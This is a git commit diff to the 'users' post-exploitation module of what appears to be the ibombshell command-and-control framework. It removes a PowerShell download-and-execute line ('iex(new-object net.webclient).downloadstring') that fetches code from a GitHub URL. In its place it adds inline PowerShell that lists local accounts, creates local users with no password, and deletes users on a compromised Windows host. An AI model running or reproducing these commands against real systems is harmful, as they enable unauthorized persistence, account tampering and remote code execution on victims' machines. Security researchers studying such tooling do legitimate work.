e3552eeccd78e8f438211b379ff0affeedb71153
Josue <j.encinar.87@gmail.com>
2019-02-11 10:03:28 +0100

    Check Powershell Version

--- ibombshell c2/modules/post/users.py
+++ ibombshell c2/modules/post/users.py
@@ -18,7 +18,57 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/data/functions/post/users')"
+        function = """
+        function users{
+            param(
+                [Parameter(Mandatory=$true)]
+                [String] $option,
+                [Parameter(Mandatory=$false)]
+                [String] $user
+            )
+
+            if ($PSVersionTable.PSVersion.Major -lt 5) {
+                return "Upgrade your powershell to version 5 or higher"
+            }
+
+                if ($option -eq "get") {
+                    return get-users	
+                } elseif ($option -eq "add"){
+                    if ($user) {
+                        New-LocalUser $user -NoPassword	
+                    } else {
+                        return "You have not written the user"
+                    }
+                } elseif ($option -eq "del") {
+                    if ($user) {
+                        Remove-LocalUser $user
+                    } else {
+                        return "You have not written the user"
+                    }
+                } else {
+                    return  "Wrong option"
+                }
+        }
+
+
+        function get-users {
+            $localEnabled = Get-LocalUser |  where-object {$_.Enabled -match "True"}
+
+            $aux = "__Enabled Accounts__`r`n"
+            Foreach ($u in $localEnabled){
+                $aux = $aux + $u + "`r`n"
+            }
+
+            $localNotEnabled = Get-LocalUser |  where-object {$_.Enabled -match "False"}
+
+            $aux = $aux + "`r`n__Unenabled accounts__`r`n"
+            Foreach ($u in $localNotEnabled){
+                $aux = $aux + $u + "`r`n"
+            }
+
+            return $aux
+        }
+        """
         op = self.args["option"]
         if op == "get":
             function += 'users -option get'
